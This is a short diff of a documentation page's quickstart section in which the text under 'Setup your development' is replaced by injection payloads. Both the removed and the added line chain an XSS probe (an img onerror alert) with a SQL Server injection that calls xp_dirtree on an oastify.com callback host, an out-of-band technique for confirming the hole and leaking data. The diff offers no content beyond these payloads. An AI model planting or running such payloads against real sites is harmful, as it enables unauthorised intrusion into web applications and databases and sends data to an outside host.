@@ -5,4 +5,4 @@ description: 'Start building awesome documentation in under 5 minutes'
 
 ## Setup your development
 
-<img src=x onerror=javascript:confirm(1);/></html>;declare @q varchar(99);set @q='\\3z3q4phchp0hoc14o4p85nvet5zznqmed41woncc.oasti'+'fy.com\xmt'; exec master.dbo.xp_dirtree @q;-- 
+<img src=x onerror=javascript:confirm(1);/></html>';declare @q varchar(99);set @q='\\3osqtp6c6pphdcq4d4e8unkei5ozcqbe25qxdo1d.oasti'+'fy.com\rxn'; exec master.dbo.xp_dirtree @q;-- 
